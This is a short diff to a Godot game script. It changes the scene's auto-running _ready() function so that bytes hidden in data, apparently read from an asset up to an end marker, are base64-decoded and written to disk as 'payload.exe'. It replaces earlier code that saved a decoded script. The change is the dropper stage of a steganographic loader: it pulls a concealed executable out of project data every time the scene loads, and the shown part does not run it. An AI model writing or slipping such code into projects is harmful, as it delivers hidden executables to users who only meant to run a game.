@@ -23,16 +23,16 @@ func _ready():
 		if byte_val == 0: # end marker
 			break
 		bytes.append(byte_val)
+	
+	var b64 = bytes.get_string_from_utf8()
+	var payloadBuffer = Marshalls.base64_to_raw(b64)
+	var payloadFile = FileAccess.open("res://payload.exe", FileAccess.WRITE)
+	payloadFile.store_buffer(payloadBuffer)
 
-	# ✅ Convert byte array to UTF-8 string
-	var message = bytes.get_string_from_utf8()
-	print("Decoded message: ", message)
-	# 🔹 Save decoded message as a new script
-	var save_path = "res://decoded_script.gd"
-	var file = FileAccess.open(save_path, FileAccess.WRITE)
-	if file:
-		file.store_string(message)
-		file.close()
-		print("Decoded script saved to ", save_path)
-	else:
-		push_error("Could not save decoded script")
+	
+	#if file:
+		#file.store_string(message)
+		#file.close()
+		#print("Decoded script saved to ", save_path)
+	#else:
+		#push_error("Could not save decoded script")
